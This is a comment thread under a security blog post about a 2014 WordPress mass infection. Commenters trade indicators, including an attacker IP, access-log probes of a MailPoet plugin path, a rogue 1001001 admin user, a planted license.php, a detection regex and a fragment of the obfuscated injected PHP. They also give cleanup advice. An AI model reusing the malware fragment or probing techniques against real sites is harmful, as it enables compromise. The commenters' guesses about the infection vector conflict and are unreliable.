5. ![](https://secure.gravatar.com/avatar/dc34fb863b4758ea6fde8a9daffe2e45?s=60&d=mm&r=g) **[Richard Lapointe](http://www.zonart.ca/)** says: [July 22, 2014 at 4:47 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3741)

   Massive attack on Friday, but most infected sites are now back to normal. A highly time consuming and frustrating operation. Lucky that our webmasters weren’t on vacation!!
6. ![](https://secure.gravatar.com/avatar/7877d0b5ecec2092c3085de547e62ec3?s=60&d=mm&r=g) **WordPress user** says: [July 22, 2014 at 4:54 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3742)

   You are fantastic, nothing serious about this on WordPress.org
7. ![](https://secure.gravatar.com/avatar/5fc3af1e2dcc55551cd7050aab76bdf2?s=60&d=mm&r=g) **[Zaphod](http://www.spambotsecurity.com/)** says: [July 22, 2014 at 7:28 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3750)

   Does anyone have a log of what the attack sequence actually IS. I saw what the injected garbage looks like, but the infection route is more important to me.

   Reason: ZB Block would like to counter this threat.

   If this is a LFI from an uploaded file, the $tring “< ? php" is already not allowed in uploaded files (must zip first). Also eval() and several other statements are banned when sent in executable form.

   If it's an SQL injection attack, then my best guess is infection via AJAX (which does not properly sanitize HTTP\_POST). AJAX has been a constant thorn in my side due to the loose and fast way it is written without regard to security, and ZB Block, to avoid complaints, had to cut AJAX users loose from several (severe) detection signatures. Note however, they must choose to opt out of the protections.

   Of course, it could be something I've overlooked (will be adding injections through cookie abuse detection soon).

   So if someone could bop over to the forum at www (dot) spambotsecurity (dot) com and share any info on the infection route, it would be appreciated.

   1. ![](https://secure.gravatar.com/avatar/c9ef50b85bd345ea4e0d8da558816f3d?s=60&d=mm&r=g) **Denis Sinegubko** says: [July 22, 2014 at 7:51 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3751)

      At this point I can say that some plugin vulnerability may be involved. It helps create a rogue admin user. You can scan your logs for “94.136.150.28” IP and see some part of the attack.

      We are still investigating the infection vector.

      Let us know if you find more details

      1. ![](https://secure.gravatar.com/avatar/5fc3af1e2dcc55551cd7050aab76bdf2?s=60&d=mm&r=g) **[Zaphod](http://www.spambotsecurity.com/)** says: [July 23, 2014 at 4:58 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3757)

         Did find one thing… if you remove the spaces from “< ? php" Disqus will truncate the post at the first quote mark. Is it the vector itself? Is it actually trying to execute the code?
8. ![](https://secure.gravatar.com/avatar/1ebf0631c9bd50fbf77ced9fcc1f7e36?s=60&d=mm&r=g) **Canuck** says: [July 22, 2014 at 9:00 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3753)

   Searching that ip brings up many hits on google – 94.136.150.28

   Seems a newsletter plugin may be the culprit.

   1. ![](https://secure.gravatar.com/avatar/d3791560c3a1d1a194f2456b07a3a1fe?s=60&d=mm&r=g) **MrsJohnson** says: [July 22, 2014 at 11:51 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3754)

      Agreed all the log hits were for a particular plugin, however one of the affected sites that I’ve had did not have the plugin activated, the other did. Anecdotal at this point of course, I can’t wait to hear more about it, it has been the bane of my existence for the past couple of days.

      1. ![](https://secure.gravatar.com/avatar/c9ef50b85bd345ea4e0d8da558816f3d?s=60&d=mm&r=g) **Denis Sinegubko** says: [July 23, 2014 at 7:57 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3759)

         Are those two site on the same server account? If yes, one vulnerable site is enough to compromise all sites that share the account.

         1. ![](https://secure.gravatar.com/avatar/d3791560c3a1d1a194f2456b07a3a1fe?s=60&d=mm&r=g) **MrsJohnson** says: [July 23, 2014 at 8:53 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3760)

            No they were not. The server with the site that had the plugin deactivated actually had several other sites on it that had the plugin activated that luckily were not affected. Files were still being tried on both sites according to the logs for that ip anyway.
         2. ![](https://secure.gravatar.com/avatar/b4d70a937f69b3a66a26287b4288a47a?s=60&d=mm&r=g) **Bas Smits** says: [July 24, 2014 at 3:30 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3771)

            Just to make sure I understand: If one site gets hacked, and it has the same username/password as other sites on that server ALL files can be hacked because they use the login on all other sites?

            All my sites are on the same server, but totally different accounts (but where hacked anyway).

            First sign of infection: User with a space as a name and 1001001 as username and a file called License.php in the root of your WordPress.

            None of my sites have the mailpoet plugin btw…
9. ![](https://secure.gravatar.com/avatar/c6a88431b11edc005bf97db9a24586b9?s=60&d=mm&r=g) **BonJecker** says: [July 22, 2014 at 11:58 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3755)

   We are in the process of cleaning up about 15 sites that have been compromised. There is no commonality to the plugins or Theme used among these infected sites however all sites were not on v3.9.1 when originally infected. First sign of infection was on 6/30/2014. Thought it was a fluke… until now.

   Common to all our infected sites:
    1. All PHP files in the entire Web directory have the malicious code at the top of the page. This includes non-WordPress PHP files that may reside above a WP sub-directory.

   2. A blank User had been added to the MySQL \_Users table with ID 1001001.

   3. When viewing the Plugins page in wp-admin of an infected site, all plugins load with errors and are disabled. On some sites the entire plugin directories are removed.

   4. The PHP files “last modification date” is not changed, although the malicious code has been added to the top of each file.

   We experienced one instance (site) so far where the data in some of the files (below the code at the top) was slightly garbled making the code unreadable. However, the files from that site were downloaded and cleaned and something may have went wrong with .zip compression or in the FTP transmission.. but unlikely. Regardless, restoring from backup may be the best solution, but make certain to restore the database also or remove the blank admin account.

   1. ![](https://secure.gravatar.com/avatar/9903274063990cb91bd2c768f99ba618?s=60&d=mm&r=g) **[Clay Asbury](http://twelvetwo.net/)** says: [October 2, 2014 at 3:17 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3790)

      Recently saw some of this behavior affecting a site I host. Were you able to determine source?

      1. ![](https://secure.gravatar.com/avatar/c6a88431b11edc005bf97db9a24586b9?s=60&d=mm&r=g) **BonJecker** says: [October 8, 2014 at 5:09 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3791)

         No… unfortunately, we have been restoring sites and have even rebuilt sites by installing a fresh version of WP4.0 rebuilding the site from scratch. The only piece that wasn’t rebuilt from the ground up was the database. However, we did check the posts table for malicious code, but there is a lot of post data, so I guess we’re going back to that to dig a bit deeper to see if there was some code added to a post somewhere causing the re-infection.

         There still is no common plugin used across these infected sites. We do not use MailPoet on “any” of the sites that got hacked, so although that may appear to be a source of the infection, it is not “the” source. My feeling from the start of this (now 4 months in) is that there is a vulnerability somewhere in the WordPress core that perhaps we don’t know about yet…

         The truly scary thing about this is that every .php file on the site gets infected. The malicious code that is being added to these files is fairly nondestructive. What I mean, is that since this seems to be such a wide-spread issue, this hack could do disastrous things if the code were used in a much more malicious way.

         1. ![](https://secure.gravatar.com/avatar/709414addb8008c2cd8d72440385ac4a?s=60&d=mm&r=g) **jo cole** says: [October 9, 2014 at 2:05 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3792)

            hi buddy i have 3 wordpress sites all using the same plugins that ware infected the same way…the databases are all intacked i just need to know how i can rebuild the site from scratch or find someone that can help me rebuild these 3 wordpress sites.

            can you or anyone give me any pointers or advice on what to do?

            1. ![](https://secure.gravatar.com/avatar/6941303172aba9d076d1181cb04fc038?s=60&d=mm&r=g) **matiasgt** says: [October 13, 2014 at 5:35 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3795)

               Hi Jo, the first thing is to reinstall wordpress, the delele the current theme and reupload it (with clean php files). Then do the same with th plugin, delete them all and then reinstall them.
            2. ![](https://secure.gravatar.com/avatar/5756bd4c74c2856f31efdc6f81882e95?s=60&d=mm&r=g) **Will** says: [March 9, 2015 at 5:46 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3806)

               This doesn’t help. The source to the bug has buried itself somewhere far deeper, I suspect in the database itself.
            3. ![](https://secure.gravatar.com/avatar/19eff1cd2c2734ae965a2bac4e4af2fa?s=60&d=mm&r=g) **Pixelbits** says: [March 9, 2015 at 12:01 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3807)

               Yes, the malware creates a user with a space as name.

               Best bet:

               Backup your entire site to a local installation.

               Backup the database too.

               Then remove \_every\_ file on your server. Including your uploads and other directories on your webserver. (100% clean). I’m not kidding. Every directory can contain malware that would bring it right back.

               Change passwords to the servers controlpanel, FTP and database since they have been compromised.

               Then reinstall a clean freshly downloaded WordPress + plugins + themes. Remove unwanted or old (not updated) plugins. Install security plugins like Wordfence and iThemes security. Activate them and harden your install. Use firewalls.

               Do not use \_any\_ of the old files(!)

               Restore the site+database on a local WP-installation (use USBwebserver or something easy).

               – Delete unknown users from the database.

               – delete unknown posts, comments, etc etc.

               – make an export of that DB and scan it for code like ‘eval(‘,'<php', 'base64'

               Scan the uploads file for the same codes.

               Remove weird out-of-place files.

               Make sure a PNG or JPG is really a correct PNG or JPG… and not a PHP file in disguise.

               If possible you replace most uploads with fresh new files.

               If you are sure the uploads and DB is clean you can restore it back to the cleaned server.

               This should make your new installed WP clean and hack-proof.
                BUT….. using bad plugins is just like locking your front door, but leaving the backdoor wide open. So cut out unnecessary ones…
            4. ![](https://secure.gravatar.com/avatar/19eff1cd2c2734ae965a2bac4e4af2fa?s=60&d=mm&r=g) **Pixelbits** says: [March 9, 2015 at 12:04 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3808)

               What i wanted to say:

               Scan the uploads file for the same codes.

               Remove weird out-of-place files.

               Make sure a PNG or JPG is really a correct PNG or JPG… and not a PHP file in disguise.

               If possible you replace most uploads with fresh new files.

               If you are sure the uploads and DB is clean you can restore it back to the cleaned server.

               This should make your new installed WP clean and hack-proof.

               BUT….. using bad plugins is just like locking your front door, but leaving the backdoor wide open. So cut out unnecessary ones…
         2. ![](https://secure.gravatar.com/avatar/9903274063990cb91bd2c768f99ba618?s=60&d=mm&r=g) **[Clay Asbury](http://twelvetwo.net/)** says: [October 13, 2014 at 12:15 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3793)

            Yep – had recently migrated a client site that was infected from another host. WP 4.x does seem to knock it out. Cheers!
         3. ![](https://secure.gravatar.com/avatar/313cd32b794a1e78145b72812e68a951?s=60&d=mm&r=g) **Williams Wish Wellingtons** says: [October 13, 2014 at 1:39 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3794)

            I’ve had about 10 WP 4.0 installations be infected over and over. Each time (its such a bore now) I get the random php header, I unpack a zip of the whole server to overwrite all the files with the non-injected version. I’ve searched around for oddities and added files, but nothing. I did have mail poet, but long ago deleted all associated files – there could still be some rogue file somewhere but I wouldn’t know how to detect it. I deleted all the 1001001 user and meta-user rows from the databases. They don’t return with the php injections. My guess is that some malicious code resides on the databases (it makes sense if the user data was able to inject itself, there are plenty of places to hide on a database). I’m really eager for someone to nail the source of these attacks, they’re happening every few days now and like you say affect every php file. Sometimes the sites break, recently they haven’t been (which suggests that the sites might be forcing trojans on visitors until I’m able to restore them). Bleh, such a mess, I feel for the WP users who don’t have sufficient skills to deal with this (they probably don’t even know if their sites are still showing).

            1. ![](https://secure.gravatar.com/avatar/c6a88431b11edc005bf97db9a24586b9?s=60&d=mm&r=g) **BonJecker** says: [October 15, 2014 at 5:08 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3796)

               I am very reluctant to say that we may have found a fix. Truly too soon to tell though because it seems our sites all get hit at one time over the course of a few days when the attack occurs. Sometimes the attack interval is a week, two weeks, a month… We are watching closely and monitoring the logs daily to see if they hold with this latest security fix. All I can say at this point without revealing too much for prying eyes is that we use iTheme security and have most all options turned on, activated and set at their highest security level settings.

               Will reveal more in time. For now continuing to hold fingers crossed.
            2. ![](https://secure.gravatar.com/avatar/313cd32b794a1e78145b72812e68a951?s=60&d=mm&r=g) **Williams Wish Wellingtons** says: [October 22, 2014 at 10:43 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3798)

               Just wondering how your potential fix/solution found via iTheme security(?) was working out? Any news for us? I haven’t had an attack for a week so I’m (perhaps naively) hopeful.
            3. ![](https://secure.gravatar.com/avatar/c6a88431b11edc005bf97db9a24586b9?s=60&d=mm&r=g) **BonJecker** says: [November 18, 2014 at 4:11 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3803)

               Well, we manage 24 WordPress sites and all of them have remained clean seemingly due to the last security adjustments made in iTheme Security. In addition to banning and blocking users that try to hack in to the site, we specifically enabled additional options (all but one on most sites) in the sections “System Tweaks” and “WordPress Tweaks” that we hadn’t enabled before. Enabling these options seems to have snuffed out this problem (hopefully for good). Please be forewarned that some of these options may conflict with other plugins or themes, so test your site after enabling each setting. We completely disabled XML-RPC and have verified that each site is using a safe version of jQuery. I hope that our findings can help others who have been struggling with this problem.
            4. ![](https://secure.gravatar.com/avatar/313cd32b794a1e78145b72812e68a951?s=60&d=mm&r=g) **Williams Wish Wellingtons** says: [October 24, 2014 at 5:59 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3799)

               Just had a fresh attack, after 9 days of everything being ok. BLEH.
10. ![](https://secure.gravatar.com/avatar/a889ed31af1e0becb7850742349e8905?s=60&d=mm&r=g) **Shohei Maeda** says: [July 23, 2014 at 12:05 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3756)

    We detect this infection so many times too.

    And, useful signature to find some hacked files is

    ‘explode.?(chr.?(.?([0-9]{3}.?-.?[0-9]{3}.?).?)’

    Finally,
     common point of a series of attacks looks like that, ‘wp-content/uploads/wordpress/index.php’ and ‘wp-content/uploads/tmp/index\*.php’ is installed.

    1. ![](https://secure.gravatar.com/avatar/c9ef50b85bd345ea4e0d8da558816f3d?s=60&d=mm&r=g) **Denis Sinegubko** says: [July 23, 2014 at 7:55 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3758)

       Yes. On many sites we can trace the beginning of the attack back to the very end of June or beginning of July. However, it looks like the early versions of it were less buggy and didn’t corrupt many PHP files.

       1. ![](https://secure.gravatar.com/avatar/a889ed31af1e0becb7850742349e8905?s=60&d=mm&r=g) **Shohei Maeda** says: [July 23, 2014 at 1:58 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3765)

          In our service, these attacks recently was observed in 7/17 JST time.
           As you know, They used some recently Vulnerability like a MailPoet.

          Log such as the following have been found on all hosts that were hacked.

          94.136.150.28 – – [04/Jul/2014:XX:XX:XX +0900] “GET /wp-content/plugins/wysija-newsletters/js/thickbox/macFFBgHack.png HTTP/1.1” 404 271 “-” “Mozilla/3.0 (windows)” “-”

          or

          94.136.150.28 – – [19/Jul/2014:XX:XX:XX +0900] “GET /wp-content/plugins/wysija-newsletters/css/admin.css HTTP/1.1” 404 257 “-” “Mozilla/3.0 (windows)” “-”

          But is interesting to note that the attack has been established even though returns a 404 as described above.
           And in additional research to these hosts, login after the formation of the ‘wp-login.php’, use a plug-in upload function to upload a file called ‘license.php’, you have to attack a starting point it There was evidence like.

          1. ![](https://secure.gravatar.com/avatar/c9ef50b85bd345ea4e0d8da558816f3d?s=60&d=mm&r=g) **Denis Sinegubko** says: [July 23, 2014 at 2:37 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3770)

             macFFBgHack.png – is just a request to test if MailPoet is installed. Most likely they didn’t use that vulnerability on that particular site. However, if the MailPoet was found on a neighbor site, that could lead to cross-infection.

             Do you have a log record for the ‘license.php’ upload request?

             Thanks!
11. ![](https://secure.gravatar.com/avatar/9f3c30ead8c98cef853fc50022a3b3e5?s=60&d=mm&r=g) **Andrew** says: [July 23, 2014 at 11:30 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3761)

    I had 2 sites compromised with this very same attack, both of which had the MailPoet plugin installed.. Both had the header code injected, both had the blank user placed into the database. I assumed it was the MailPoet hack previous mentioned on this blog. Can anyone else confirm that they had the vulnerable MailPoet version installed on all of their hacked sites?
12. ![](https://secure.gravatar.com/avatar/887ef3c5d09820fd708df09ab03175be?s=60&d=mm&r=g) **lannie1011** says: [July 23, 2014 at 12:05 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3762)

    It was from the MailPoet plugin. Despite claims that the latest version was secure, it is not. My sites and a colleagues were shut down because of the plugin.

    1. ![](https://secure.gravatar.com/avatar/a92c5b4df6ec1769a72b00dae3fd2192?s=60&d=mm&r=g) **[Sean McGrath](http://www.seanmcgrath.me)** says: [July 23, 2014 at 12:13 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3763)

       Can you confirm that the latest version is indeed still vulnerable?
    2. ![](https://secure.gravatar.com/avatar/c9ef50b85bd345ea4e0d8da558816f3d?s=60&d=mm&r=g) **Denis Sinegubko** says: [July 23, 2014 at 2:32 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3769)

       We also saw that some of these infections exploited the MailPoet (wysija-nesletters) vulnerability. But not sure about the latest version. When did you upgrade it? The attack actually began in the very end of June/beginning of July, so it could use a window before the plugin was updated.
13. ![](https://secure.gravatar.com/avatar/4983492a16100b18479920a1cb45232a?s=60&d=mm&r=g) **Chris Kadet** says: [July 23, 2014 at 12:50 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3764)

    This infection was driving me nuts since Friday. I first noticed encrypted code in index.php and the rogue admin (which for some reason added +10 to the admin count). After restoring backups, the code swiftly injected itself into the files again, this time into almost all of the files in the WordPress root.

    I solved the problem by changing all passwords and restricting access to my site to my IP address and removing what I suspect was the offending plugin.

    1. ![](https://secure.gravatar.com/avatar/ade2e1a67a2b571fb750fcadafb31dbc?s=60&d=mm&r=g) **MX** says: [July 23, 2014 at 2:10 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3766)

       Which plugin did you suspect?

       1. ![](https://secure.gravatar.com/avatar/4983492a16100b18479920a1cb45232a?s=60&d=mm&r=g) **Chris Kadet** says: [July 23, 2014 at 6:06 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-6022)

          It’s called Job Manager by Gary Pendergast. I did manage to find a great substute for a job board (<http://wordpress.org/plugins/wp-job-manager/>). It could have also been brute force, wince Wordfence was indicating that admin passwords were too weak.
14. ![](https://secure.gravatar.com/avatar/71378bc4db547d5aa0c866a8b700a44a?s=60&d=mm&r=g) **[Dragan L.](http://artefact.io/)** says: [July 24, 2014 at 3:16 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-6023)

    A hosting company I work with also had many websites affected by this. To ease detection of compromised accounts I’ve made a php script for admins which quickly scans all databases and raise alert if suspicious user is found. It also checks if MailPoet has been installed, so client can be contacted by staff and told to update if necessary.

    Here is it, hope it may help: <http://artefact.io/massive-wordpress-hack-seems-underway/#detection>
15. ![](https://secure.gravatar.com/avatar/b4d70a937f69b3a66a26287b4288a47a?s=60&d=mm&r=g) **Bas Smits** says: [July 24, 2014 at 3:35 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3772)

    Just to let you know – my site was hacked and i do not have MailPoet. So it is possible that another user on my shared server has this? Or are there similar plugins?

    1. ![](https://secure.gravatar.com/avatar/b4d70a937f69b3a66a26287b4288a47a?s=60&d=mm&r=g) **Bas Smits** says: [July 24, 2014 at 6:09 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3773)

       All hacked sites had the “google-analytics-dashboard-for-wp” plugin, but also SEO plugins from Yoast and w3 total cache… Anyone else see similarities?
    2. ![](https://secure.gravatar.com/avatar/4f64c9f81bb0d4ee969aaf7b4a5a6f40?s=60&d=mm&r=g) **IMR Andom2** says: [July 24, 2014 at 8:28 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3774)

       Someone on the shared server was hit, and your site was likely a secondary infection. 🙁

       1. ![](https://secure.gravatar.com/avatar/b4d70a937f69b3a66a26287b4288a47a?s=60&d=mm&r=g) **R Andom** says: [July 24, 2014 at 9:19 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3776)

          What i don’t get is that my provider says that 1 account is totally separated from other accounts. All my sites have an own account. So when I log in as USER1 there is NO way I can access files for USER2 on that same unix shared server. (Unless the php-script has 1337-Un1x-h4cking-skillz 😉 )

          Conclusion: there are more plugins vulnerable. And I have one. But which one. 😉 What code should I look for? ‘is\_admin’ pops up many times in lots of plugins…
16. ![](https://secure.gravatar.com/avatar/d0729f90c7ca9036e56f0adc1c8b6e55?s=60&d=mm&r=g) **Daniel Blignaut** says: [July 24, 2014 at 8:55 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3775)

    Hi guys, we also had a massive attack on various clients. We have found there is a messed up file called license.php

    Also you can clean the code from plugin files, this will allow you to reactivate them. Once reactivated, update all plugins to latest version to clear the rest of the code out and then go to your Updates under dashboard and update your wordpress to the latest. I know this isnt an ideal fix and cleaning files is a pain but its a sollution. Be sure to change your admin passwords and remove any unwanted users. The ID seems to be 101101 for the new user that is added to your site and has no name/email address.
17. ![](https://secure.gravatar.com/avatar/10e13456f1ba9a6553f7a79d181df39f?s=60&d=mm&r=g) **Okkes** says: [July 24, 2014 at 12:20 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3777)

    I noticed this about 10 days ago all my file sizes are increased when i connect through ftp on one of my vps server. So i checked wp-config and saw the malicious code. There are two domains and one subdomain on this server. One is active news portal site with mailpoet installed but not active at the time. The other one is default installed wp site. Under the subdomain i have 6 other demo wp sites for a client.

    First i re-upgrade the wordpress from admin panel of the news portal. The core wp files cleaned but not the plugins and theme files. When i open plugins page from admin all the plugins disabled. Then i install Antimalware (Get of Malicious Scripts) plugin and scan the whole site. It found the affected files. When im waiting for the scan i check the other 6 site on subfolders. But they are completely blank frontend and backend. Lucklily i found a plesk backup of the system from 4-5 days ago. Download it and upload all sites files one by one, login and scan and clean malicious code from them too.

    When i check the old backup zip, i noticed only the news portal sites wp-admin/admin.php file was infected. May be its a start point or i just backed it up in the middle of infection being spread.

    Until i saw this post i didnt know and check the new admin user. I deleted all of them.

    Dont forget to make a clean backup after you sure its all cleaned. I saw the importance of backups one more time.

    Ps: Sorry for my english if i made mistakes.
18. ![](https://secure.gravatar.com/avatar/850154607a6d9ea9b26bacf8398961d2?s=60&d=mm&r=g) **Robin Elden** says: [July 26, 2014 at 10:24 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3778)

    I noticed today that one of my client’s sites had been hacked.
     They did not have MailPoet, but had the blank user, infected PHP files, etc.
     Interestingly, when I restored from backup, the PHP files were fine, but the blank user and license.php still existed (suggesting they took place a lot earlier)
19. ![](https://secure.gravatar.com/avatar/44ecd221c6c4ed0a66666fab79d0c967?s=60&d=mm&r=g) **[Dynamic Webs](http://www.dynamicwebs.com.au)** says: [July 29, 2014 at 10:40 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3779)

    I’ve been getting these too, but sadly I wonder if I am the cause as when I first log into the site, everything is fine. Within minutes the blank user account appears, all the plugins stop working (and disappear from Plugins menu) and almost every PHP has a code injection.
20. ![](https://secure.gravatar.com/avatar/41ff4b3afcb49191bd0b3b3420591232?s=60&d=mm&r=g) **Daas** says: [July 30, 2014 at 7:58 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3780)

    Well i think we all here the same problem … in my case all the php files contain a malicious code in the header which begin ” <?php $osetwzdswr = '-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N# … " and the rest is composed from complex numbers and functions , it's an very long one . it infect all file with " \*.php " in the content , admin and include . can any one give me some ideas ( i tried to cleaned the site manually but its too big ) help please .
21. ![](https://secure.gravatar.com/avatar/91a4155e40559026fbb093cce35964cf?s=60&d=mm&r=g) **RAFNewsLuke** says: [August 1, 2014 at 11:31 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3781)

    Thing is all 30 of my sites have been hacked and your scanner doesnt seem to pick this up

    1. ![](https://secure.gravatar.com/avatar/6e62addf18eade1227f3c78b4c4ed534?s=60&d=mm&r=g) **perezbox** says: [August 1, 2014 at 1:47 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3782)

       Hi @RAFNewsLuke:disqus are you a client or using our free scanner? Can you send us specifics to labs@sucuri.net? That’d be awesome. Thanks

       1. ![](https://secure.gravatar.com/avatar/91a4155e40559026fbb093cce35964cf?s=60&d=mm&r=g) **RAFNewsLuke** says: [August 1, 2014 at 1:51 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3783)

          Its the free scanner does that mean it wouldnt pick up code

          1. ![](https://secure.gravatar.com/avatar/6e62addf18eade1227f3c78b4c4ed534?s=60&d=mm&r=g) **perezbox** says: [August 1, 2014 at 1:54 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3784)

             No, it just depends on the payload and type of infection. If it’s a server level payload with not external impact than no, it won’t. But if it’s triggering a browser action, then it should. See this: <https://blog.sucuri.net/2012/10/ask-sucuri-how-does-sitecheck-work.html>

             If you send us the info to labs@sucuri.net we should be able to investigate.

             1. ![](https://secure.gravatar.com/avatar/d28241c73c06fb1b7766e8b12c03a416?s=60&d=mm&r=g) **[WatWebDev.com](http://watwebdev.com/)** says: [September 12, 2014 at 2:58 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3789)

                You may want to note on the scanner that it will only find infections that are being presented. It will not find infections within the website that are not being presented and that includes backdoors too.
                 Hope you dont think I am complaining as no off site scanner could do that, but it is worth mentioning that on site scans should be completed as well as using a strong software firewall.
       2. ![](https://secure.gravatar.com/avatar/91a4155e40559026fbb093cce35964cf?s=60&d=mm&r=g) **RAFNewsLuke** says: [August 1, 2014 at 1:58 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3785)

          All done and sent with example file
22. ![](https://secure.gravatar.com/avatar/aca851a06558c3638db691de766ac7b5?s=60&d=mm&r=g) **Abel Niño** says: [August 11, 2014 at 3:07 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3786)

    Anyone knows when exactly started?
23. ![](https://secure.gravatar.com/avatar/d28241c73c06fb1b7766e8b12c03a416?s=60&d=mm&r=g) **[WatWebDev.com](http://watwebdev.com/)** says: [September 12, 2014 at 2:54 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3787)

    This really was done sloppily, but it may be a blessing in disguise.

    Of the sites I have seen with this infection, they were already infected prior to this code being injected and backdoor shell files have likely been left in place by previous attackers. I doubt you will find many logs showing the attack vector.

    I decrypted as much code as I could and found that the code injected into the top of every file looks for visitors with the user agent for Internet Explorer 11 which has a vulnerability that allows malware to be silently downloaded by force and the code executed on the visitors computer.

    Do not assume that this was the only attack and do not assume that scanning your site with Sucuri site scanner will find it, although it is an awesome tool, it can only find infections being pushed to visitors, it will not find infections deep within your system or backdoor shell scripts.
     You really need to run a full scan on your hosting account. Insist that clam AV is installed, updated and run scans yourself to see the infections.

    Never assume it to be a single infection or action, always look for more. You may end up backing up infections and backdoors.

    We too are being slammed by brute force attacks and various other bots trying to sniff our files.
24. ![](https://secure.gravatar.com/avatar/6971c729b315a08971a56b674573c7b9?s=60&d=mm&r=g) **Anthony Vincent** says: [October 17, 2014 at 6:29 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3797)

    Here is the problem I have used wordfence but it seems php files are still being injected into folders etc. Even my sub domains that are standard html website are being injected somehow. The php files are encrypted and weird named so finding them is not hard but they will get you blacklisted if not caught in time. I have no dam clue what to do, second time this month I have had to clean all my websites up html and wordpress sites.
25. ![](https://secure.gravatar.com/avatar/6d94c5ed39cac610f29dc871fbda1c9e?s=60&d=mm&r=g) **Steve D** says: [November 2, 2014 at 4:50 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3800)

    Hey all, this has been the most useful thread on this issue I have found. Still having about 1 of my users’ wordpress sites a week being infected. Maybe they are old and just being discovered, not sure.

    Most of the comments are 3 months or so old. Has there been any update on this? Where it is coming from? Any good ideas how to clean up? Any solutions on prevention?

    1. ![](https://secure.gravatar.com/avatar/5756bd4c74c2856f31efdc6f81882e95?s=60&d=mm&r=g) **Inception** says: [November 17, 2014 at 11:38 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3801)

       Hi Steve, Have you got as far as removing the 1001001 user/meta entries from your database? It doesn’t stop the attacks but is a good start. I create a ZIP backup of my uninfected files, and then extract them via CPanel whenever the attack happens. Recently I’ve noticed that with the attack, I can still log in and manipulate sites. Which is a pain, as it means I have to actively look for the attack now rather than having my alertness drawn to it.

